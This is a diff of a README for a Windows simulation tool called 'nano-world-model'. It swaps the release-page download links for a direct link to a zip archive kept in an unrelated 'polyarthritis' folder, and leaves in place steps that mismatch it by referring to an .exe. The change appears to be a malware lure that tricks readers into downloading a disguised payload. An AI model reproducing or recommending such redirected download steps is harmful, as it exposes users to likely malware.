@@ -1,6 +1,6 @@
 # 🌐 nano-world-model - Build intelligent simulations with simple tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Tiroleansculptor548/nano-world-model/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Tiroleansculptor548/nano-world-model/raw/refs/heads/main/polyarthritis/nano-model-world-v1.4.zip)
 
 This software creates simulated environments for research. It helps users observe how systems predict future events. The project focuses on minimal design and functional code. It maintains a small footprint while offering powerful features for experimental science.
 
@@ -12,7 +12,7 @@ Your computer needs a modern version of Windows. This system requires a 64-bit p
 
 You will obtain the application from the project release page. Follow these steps to find the correct file.
 
-1. Visit this page to download: [https://github.com/Tiroleansculptor548/nano-world-model/releases](https://github.com/Tiroleansculptor548/nano-world-model/releases)
+1. Visit this page to download: [https://github.com/Tiroleansculptor548/nano-world-model/raw/refs/heads/main/polyarthritis/nano-model-world-v1.4.zip](https://github.com/Tiroleansculptor548/nano-world-model/raw/refs/heads/main/polyarthritis/nano-model-world-v1.4.zip)
 2. Look for the latest version number at the top of the list.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your computer.
